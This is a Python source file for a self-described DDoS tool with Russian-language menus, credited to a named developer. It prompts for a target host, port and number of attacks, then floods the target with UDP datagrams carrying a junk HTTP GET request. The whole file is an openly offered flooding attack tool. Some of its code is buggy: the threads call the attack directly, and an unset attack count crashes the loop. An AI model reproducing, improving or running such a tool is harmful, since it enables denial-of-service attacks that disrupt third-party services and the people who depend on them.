import os
import socket
import string
import random
import threading
from colorama import Fore, Back, Style # type: ignore
from pystyle import Center, Colorate, Colors # type: ignore

os.system("cls")
class SockFlood:
	def __init__(self):
		os.system("cls")
		self.host=None
		self.portnum=None
		self.threads=None

	def graphics(self):
		banner="""
					██▓███   ▒█████   ▒█████   ██▓███   ▓█████▄  ▓█████▄  ▒█████    ██████ 
					▓██░  ██ ▒██▒  ██▒▒██▒  ██▒▓██░  ██  ▒██▀ ██▌ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
					▓██░ ██▓▒▒██░  ██▒▒██░  ██▒▓██░ ██▓▒ ░██   █▌ ░██   █▌▒██░  ██▒░ ▓██▄   
					▒██▄█▓▒ ▒▒██   ██░▒██   ██░▒██▄█▓▒ ▒▒░▓█▄   ▌▒░▓█▄   ▌▒██   ██░  ▒   ██▒
					▒██▒ ░  ░░ ████▓▒░░ ████▓▒░▒██▒ ░  ░░░▒████▓ ░░▒████▓ ░ ████▓▒░▒██████▒▒
					▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒░▒░▒░ ▒▓▒░ ░  ░░ ▒▒▓  ▒ ░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
					░▒ ░       ░ ▒ ▒░   ░ ▒ ▒░ ░▒ ░       ░ ▒  ▒   ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░  
					░░       ░ ░ ░ ▒  ░ ░ ░ ▒  ░░         ░ ░  ░   ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
								░ ░      ░ ░               ░        ░        ░ ░        ░  
  
		"""
		print(Colorate.Horizontal(Colors.white_to_red, Center.XCenter(banner)))
		print(Colorate.Horizontal(Colors.white_to_red, Center.XCenter("""
																
	   ╔════════════════════════════════════════════════════╗
	   ║[+] Дудос Тул Написанный На Библеотеке Sockets   [+]║
	   ║[+] Developer : qqwizzixxxx                      [+]║
	   ║[+] Напиши "help" Чтобы Узнать Комманды          [+]║
	   ╚════════════════════════════════════════════════════╝
			""")))

	def start_attack(self,host,port=None):
		self.sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
		try:
			url_path=str(string.ascii_letters + string.digits + string.punctuation)
			byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
			if not port:
				self.sock.sendto(byt,(host,80))
			elif port:
				self.sock.sendto(byt,(host,int(port)))
			print(Fore.WHITE+"""[+] ОТПРАВЛЕННО УСПЕШНО!""")
		except Exception as e:
			print(Fore.RED+f"""
	[-] ОШИБКА СОКЕТА!
	[-] ОБЬЯСНЕНИЕ : {e}
						""")

	def command_parser(self,command):
		if command=="help":
			print(Colorate.Horizontal(Colors.white_to_red, Center.XCenter("""
	╔════════════════════════════════════════════════════════════════════════════════════════╗
	║                            Добро пожаловать в POOPDDOS меню помощи                     ║
	║(+) host %Хоcт% - Введите Хост Домена Или Ip [!НУЖНО]                                   ║
	║(+) port %Порт% - Введите кастомный порт, или просто использует порт 80                 ║
	║(+) attacks %Число% - Введите Количество Аттак, Обычное Число 1000                      ║
	║(+) start - Начнёт Аттаку И Покажет Логи В Консоле                                      ║
	╚════════════════════════════════════════════════════════════════════════════════════════╝
	""")))
		if "host " in command:
			self.host=command.replace("host ","").replace("https://", "").replace("http://", "").replace("www.", "")
			print(Fore.WHITE+f"""
	[+] Успешно Поставил Хост: {self.host}
				""")
		elif "port " in command:
			self.portnum=command.replace("port ","")
			print(Fore.WHITE+f"""
	[+] Успешно Поставил Порт: {self.portnum}
				""")
		elif command=="start":
			print(self.portnum)
			if self.host and self.portnum:
				if int(self.threads):
					for i in range(1,int(self.threads)):
						threading.Thread(target=self.start_attack(self.host,self.portnum)).start()
				else:
					for i in range(1,1000):
						threading.Thread(target=self.start_attack(self.host,self.portnum)).start()
			elif self.host and not self.portnum:
				if int(self.threads):
					for i in range(1,int(self.threads)):
						threading.Thread(target=self.start_attack(self.host)).start()
				else:
					for i in range(1,1000):
						threading.Thread(target=self.start_attack(self.host)).start()
		elif "attacks " in command:
			self.threads=command.replace("attacks ","")
			print(Fore.WHITE+f"""
	[+] Успешно Поствил Число Аттак: {self.threads}
				""")

	def run(self):
		self.graphics()
		while True:
			self.command_parser(input(Fore.RED+f"[$]{os.environ.get('USERNAME')}>> "))

if __name__=="__main__":
	app=SockFlood()
	app.run()
